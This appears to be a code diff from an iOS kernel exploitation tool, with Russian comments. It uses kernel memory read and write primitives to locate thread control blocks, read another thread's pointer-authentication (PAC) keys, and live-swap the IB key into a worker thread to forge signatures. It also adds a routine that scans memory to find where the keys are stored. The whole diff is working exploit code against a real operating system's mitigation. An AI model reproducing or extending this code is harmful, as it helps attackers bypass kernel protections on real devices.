@@ -162,65 +162,61 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
     uint64_t kva = [KPDump rcResolveThreadKVA:mp];
     if (!kva) { paclog(@"    [rp] worker thread_t resolve FAIL"); g_pac_stop = 1; return 0; }
 
-    // upcb — настоящее хранилище ключей (arm_pac_key_state_t), тип 0x21
+    // upcb — настоящее хранилище ключей (arm_pac_key_state_t), тип 0x21.
+    // Пишем ТОЛЬКО подтверждённый ключевой слот +0xE8 (IB): соседи — saved
+    // state, мусор туда = copy_validate panic (доказано ребутом).
     uint64_t upcb = kp_pac_nativestrip(kp_rc_kread64(kva + 0x100));
-    uint64_t rupcb = kp_pac_nativestrip(kp_rc_kread64(remotethreadaddr + 0x100));
-    paclog(@"    [rp] worker upcb=%#llx remote upcb=%#llx", upcb, rupcb);
+    uint64_t rupcb_raw = kp_rc_kread64(remotethreadaddr + 0x100);
+    uint64_t rupcb = kp_pac_nativestrip(rupcb_raw);
+    int rupcb_ok = (rupcb & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
+    paclog(@"    [rp] worker upcb=%#llx remote upcb=%#llx %@", upcb, rupcb, rupcb_ok ? @"" : @"— невалиден, swap пропускаю");
 
-    // читаем ключи remote из ЕГО upcb (IB по +0xE8 подтверждён охотой)
-    uint64_t keya_u = rupcb ? kp_rc_kread64(rupcb + 0xE0) : 0;
-    uint64_t keyb_u = rupcb ? kp_rc_kread64(rupcb + 0xE8) : 0;
-    paclog(@"    [rp] remote upcb keys: +0xE0=%#llx +0xE8=%#llx", keya_u, keyb_u);
+    uint64_t keyb_u = rupcb_ok ? kp_rc_kread64(rupcb + 0xE8) : 0;
+    paclog(@"    [rp] remote upcb IB(+0xE8)=%#llx", keyb_u);
 
-    uint64_t oa = kp_rc_kread64(upcb + 0xE0);
     uint64_t ob = kp_rc_kread64(upcb + 0xE8);
-    paclog(@"    [rp] worker orig upcb keys: +0xE0=%#llx +0xE8=%#llx", oa, ob);
+    paclog(@"    [rp] worker orig IB(+0xE8)=%#llx", ob);
 
     // baseline: worker signs with its own keys
     for (int i = 0; i < 500 && !g_pac_out; i++) usleep(1000);
     uint64_t baseline = g_pac_out;
-    paclog(@"    [rp] baseline (свои ключи): %#llx", baseline);
+    uint64_t baselineB = g_pac_out_b;
+    paclog(@"    [rp] baseline: pacia=%#llx pacib=%#llx", baseline, baselineB);
 
-    // live key swap в upcb-слоты
-    if (rupcb && upcb) {
-        kp_rc_kwrite64(upcb + 0xE0, keya_u);
+    // live key swap — только подтверждённый слот +0xE8
+    if (rupcb_ok)
         kp_rc_kwrite64(upcb + 0xE8, keyb_u);
-    }
-    uint64_t ra = kp_rc_kread64(upcb + 0xE0);
     uint64_t rb = kp_rc_kread64(upcb + 0xE8);
-    paclog(@"    [rp] upcb keys после swap: +0xE0=%#llx +0xE8=%#llx", ra, rb);
+    paclog(@"    [rp] upcb IB после swap=%#llx", rb);
 
-    uint64_t newsig = baseline;
+    uint64_t newsig = baseline, newsigB = baselineB;
     for (int i = 0; i < 300; i++) {
         usleep(1000);
-        if (g_pac_out != baseline) { newsig = g_pac_out; break; }
+        if (g_pac_out != baseline || g_pac_out_b != baselineB) { newsig = g_pac_out; newsigB = g_pac_out_b; break; }
     }
-    newsig = g_pac_out;
-    paclog(@"    [rp] после swap (remote ключи): %#llx — %@", newsig,
-           newsig != baseline ? @"ИЗМЕНИЛАСЬ — ключи перезагрузились по живому!" : @"не изменилась за 300мс");
+    newsig = g_pac_out; newsigB = g_pac_out_b;
+    paclog(@"    [rp] после swap: pacia=%#llx pacib=%#llx — %@", newsig, newsigB,
+           newsigB != baselineB ? @"pacib ИЗМЕНИЛАСЬ — upcb ЖИВОЕ хранилище!" : @"pacib не изменилась за 300мс");
 
-    // restore original keys before the worker exits (dies clean)
-    if (upcb) {
-        kp_rc_kwrite64(upcb + 0xE0, oa);
-        kp_rc_kwrite64(upcb + 0xE8, ob);
-    }
-    uint64_t ra2 = kp_rc_kread64(upcb + 0xE0);
+    // restore original IB before the worker exits (dies clean)
+    kp_rc_kwrite64(upcb + 0xE8, ob);
     uint64_t rb2 = kp_rc_kread64(upcb + 0xE8);
-    paclog(@"    [rp] restore: %@", (ra2 == oa && rb2 == ob) ? @"вернули" : @"НЕ ВЕРНУЛИ!");
+    paclog(@"    [rp] restore: %@", (rb2 == ob) ? @"вернули" : @"НЕ ВЕРНУЛИ!");
 
     g_pac_stop = 1;
     for (int i = 0; i < 100; i++) usleep(1000); // let the worker see the flag and exit
     return newsig;
 }
 
-// upcb slot calibration: poke candidate slots with garbage one at a time and
-// watch which signature (pacia=IA / pacib=IB) moves. 0xE8 must move pacib.
+// upcb key-slot discovery READ-ONLY: two same-task threads — key slots hold
+// EQUAL high-entropy values (per-task keys); saved-state slots differ.
+static void pacnote2(uint32_t off, uint64_t val, int popcount);
 void kp_upcbcalib(uint64_t threadVA)
 {
     g_pac_in_a = 0x41414141;
     g_pac_in_m = kp_ptrauthstrdisc("pc");
-    g_pac_out = 0; g_pac_out_b = 0; g_pac_stop = 0;
-
+    g_pac_out = 0; g_pac_out_b = 0;
+    g_pac_stop = 0;
     pthread_t pt;
     if (pthread_create(&pt, NULL, kp_pacworker, NULL)) { paclog(@"    [cal] pthread_create fail"); return; }
     pthread_detach(pt);
@@ -228,28 +224,30 @@ void kp_upcbcalib(uint64_t threadVA)
     uint64_t kva = [KPDump rcResolveThreadKVA:pthread_mach_thread_np(pt)];
     if (!kva) { paclog(@"    [cal] resolve fail"); g_pac_stop = 1; return; }
 
-    uint64_t upcb = kp_pac_nativestrip(kp_rc_kread64(kva + 0x100));
-    paclog(@"    [cal] worker upcb=%#llx", upcb);
-    if ((upcb & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) { g_pac_stop = 1; return; }
+    uint64_t upcbA = kp_pac_nativestrip(kp_rc_kread64(threadVA + 0x100));
+    uint64_t upcbB = kp_pac_nativestrip(kp_rc_kread64(kva + 0x100));
+    paclog(@"    [cal] upcbA=%#llx upcbB=%#llx", upcbA, upcbB);
+    if ((upcbA & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL ||
+        (upcbB & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) { g_pac_stop = 1; return; }
 
-    for (int i = 0; i < 500 && !g_pac_out; i++) usleep(1000);
-    uint64_t baseA = g_pac_out, baseB = g_pac_out_b;
-    paclog(@"    [cal] baseline: pacia=%#llx pacib=%#llx", baseA, baseB);
-
-    const uint32_t slots[] = {0xE8, 0xE0, 0xF0, 0xD8, 0xD0, 0xF8, 0x100, 0xC8, 0xC0, 0xB8};
-    for (int s = 0; s < 10; s++) {
-        uint64_t addr = upcb + slots[s];
-        uint64_t orig = kp_rc_kread64(addr);
-        kp_rc_kwrite64(addr, 0x4141414141414141ULL);
-        usleep(60000);
-        uint64_t a2 = g_pac_out, b2 = g_pac_out_b;
-        kp_rc_kwrite64(addr, orig);
-        usleep(20000);
-        paclog(@"    [cal] upcb+%#x (orig=%#llx): pacia %@ · pacib %@",
-               slots[s], orig,
-               (a2 != baseA) ? [NSString stringWithFormat:@"→ %#llx ИЗМЕНИЛАСЬ!", a2] : @"—",
-               (b2 != baseB) ? [NSString stringWithFormat:@"→ %#llx ИЗМЕНИЛАСЬ!", b2] : @"—");
+    int n = 0;
+    for (uint32_t o = 0; o < 0x200; o += 8) {
+        uint64_t a = kp_rc_kread64(upcbA + o);
+        uint64_t b = kp_rc_kread64(upcbB + o);
+        if (a && a == b) {
+            // энтропия: считаем популяцию бит
+            uint64_t v = a; int pc = 0; while (v) { pc += v & 1; v >>= 1; }
+            pacnote2(o, a, pc);
+            n++;
+        }
     }
+    paclog(@"    [cal] совпадающих ненулевых слотов: %d", n);
     g_pac_stop = 1;
     usleep(20000);
+}
+
+static void pacnote2(uint32_t off, uint64_t val, int popcount)
+{
+    paclog(@"    [cal] upcb+%#x = %#llx (popcount=%d)%@", off, val, popcount,
+           popcount > 20 ? @" КЛЮЧ-КАНДИДАТ" : @"");
 }
